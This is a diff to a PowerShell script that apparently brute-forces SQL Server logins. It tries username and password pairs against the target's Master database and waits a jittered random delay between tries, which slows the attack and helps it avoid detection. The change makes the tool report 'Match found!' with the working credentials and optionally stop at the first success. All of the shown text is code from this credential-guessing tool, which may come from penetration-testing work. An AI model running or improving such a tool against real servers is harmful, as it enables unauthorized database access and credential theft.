@@ -131,7 +131,7 @@ Goude 2012, TreuSec
                     Default { "Unknown" }
                 }
             }
-
+            $Connection.Close()
             # Shamelessly stolen from https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
             Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
         }
@@ -146,7 +146,15 @@ Goude 2012, TreuSec
                     {
                         $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
                         Write-Verbose "Checking $userName : $password"
-                        CheckForSQLSuccess
+                        $success = CheckForSQLSuccess
+                        if ($success)
+                        {
+                            Write-Output "Match found! $username : $password"
+                            if ($StopOnSuccess)
+                            {
+                                break UsernameLoop
+                            }
+                        }
                     }
                 }
             }
